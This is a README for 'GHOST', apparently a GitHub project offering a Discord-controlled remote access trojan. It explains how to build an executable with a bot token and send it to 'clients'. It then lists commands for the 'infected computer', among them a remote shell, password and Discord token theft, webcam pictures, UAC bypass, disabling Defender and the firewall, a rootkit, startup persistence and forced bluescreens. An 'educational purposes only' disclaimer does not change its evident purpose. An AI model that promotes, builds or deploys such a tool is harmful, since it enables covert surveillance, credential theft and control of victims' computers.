---

# GHOST – Grandma’s Hidden Operational Surveillance Tool

GHOST is a stealthy Discord RAT designed for remote access and surveillance through Discord. With GHOST, you can deploy your tool quickly and easily, gaining control over remote systems.

## Features

- **User-Friendly Setup**: Download the ZIP file from the releases and run `GHOST.exe` to build your custom executable.
- **Remote Access**: Execute commands remotely via Discord.
- **Stealth Operation**: Operate in the background, ensuring discreet surveillance and access.
- **Versatile Command List**: A comprehensive set of commands for various operations.

## Installation

### Prerequisites

- Windows OS
- Discord account for bot token and server setup

### Setting Up GHOST

1. **Download GHOST**:
   - Go to the [Releases page](https://github.com/ShadowByte098/Discord-Rat-GHOST/releases) and download the ZIP file.

2. **Extract the ZIP File**:
   - Extract the contents to a folder on your computer.

3. **Run the Builder**:
   - Open the folder and run `GHOST.exe` to build your executable. Follow the on-screen prompts to enter your bot token and server ID.

4. **Deploy the Executable**:
   - Once built, you can send the generated executable to your clients.

## Available Commands

Once the client runs the executable, you can execute the following commands through Discord:

- **!message**: Show a message box displaying your text.  
  *Syntax*: `!message example`
  
- **!shell**: Execute a shell command.  
  *Syntax*: `!shell whoami`
  
- **!voice**: Make a voice say a custom sentence.  
  *Syntax*: `!voice test`
  
- **!admincheck**: Check if the program has admin privileges.
  
- **!cd**: Change directory.
  
- **!dir**: Display all items in the current directory.
  
- **!download**: Download a file from the infected computer.
  
- **!upload**: Upload a file to the infected computer.  
  *Syntax*: `!upload file.png` (with attachment)
  
- **!uploadlink**: Upload a file from a link to the infected computer.  
  *Syntax*: `!upload link file.png`
  
- **!delete**: Delete a file.  
  *Syntax*: `!delete /path/to/file.txt`
  
- **!write**: Type your desired sentence on the computer.
  
- **!wallpaper**: Change the infected computer's wallpaper.  
  *Syntax*: `!wallpaper` (with attachment)
  
- **!clipboard**: Retrieve the infected computer's clipboard content.
  
- **!idletime**: Get the idle time of the user on the target computer.
  
- **!currentdir**: Display the current directory.
  
- **!block**: Block the user's keyboard and mouse.  
  *Warning*: Admin rights are required.
  
- **!unblock**: Unblock the user's keyboard and mouse.  
  *Warning*: Admin rights are required.
  
- **!screenshot**: Get a screenshot of the user's current screen.
  
- **!exit**: Exit the program.
  
- **!kill**: Kill a session or all sessions.  
  *Syntax*: `!kill session-3` or `!kill all`
  
- **!uacbypass**: Attempt to bypass UAC to gain admin rights using windir and slui.
  
- **!shutdown**: Shutdown the computer.
  
- **!restart**: Restart the computer.
  
- **!logoff**: Log off the current user.
  
- **!bluescreen**: Blue screen the PC.
  
- **!datetime**: Display the system date and time.
  
- **!prockill**: Kill a process by name.  
  *Syntax*: `!kill process`
  
- **!disabledefender**: Disable Windows Defender.  
  *Requires admin rights.*
  
- **!disablefirewall**: Disable Windows Firewall.  
  *Requires admin rights.*
  
- **!audio**: Play an audio file on the target computer.  
  *Syntax*: `!audio` (with attachment)
  
- **!critproc**: Make the program a critical process, meaning if it's closed, the computer will blue screen.  
  *Requires admin rights.*
  
- **!uncritproc**: Remove the critical process status from the program.  
  *Requires admin rights.*
  
- **!website**: Open a website on the infected computer.  
  *Syntax*: `!website www.google.com`
  
- **!disabletaskmgr**: Disable Task Manager.  
  *Requires admin rights.*
  
- **!enabletaskmgr**: Enable Task Manager if disabled.  
  *Requires admin rights.*
  
- **!startup**: Add to startup (this file starts when the computer is turned on).
  
- **!geolocate**: Geolocate the computer using the latitude and longitude of the IP address with Google Maps.  
  *Warning*: Geolocating IP addresses is not very precise.
  
- **!listprocess**: Get all processes.
  
- **!password**: Grab all passwords.
  
- **!rootkit**: Launch a rootkit (the process will be hidden from Task Manager and you won't be able to see the file).  
  *Requires admin rights.*
  
- **!unrootkit**: Remove the rootkit.  
  *Requires admin rights.*
  
- **!getcams**: Grab the names of the cameras and their respective selection numbers.
  
- **!selectcam**: Select a camera to take a picture from (default is camera 1).  
  *Syntax*: `!selectcam 1`
  
- **!webcampic**: Take a picture from the selected webcam.
  
- **!grabtokens**: Grab all Discord tokens on the current PC.
  
- **!help**: Display this help menu.

## Disclaimer

GHOST is intended for educational purposes only. Ensure that you have permission from any users before deploying this tool. Misuse of this software can lead to severe legal consequences.

## Contributing

Contributions are welcome! If you'd like to contribute, please fork the repository and submit a pull request.
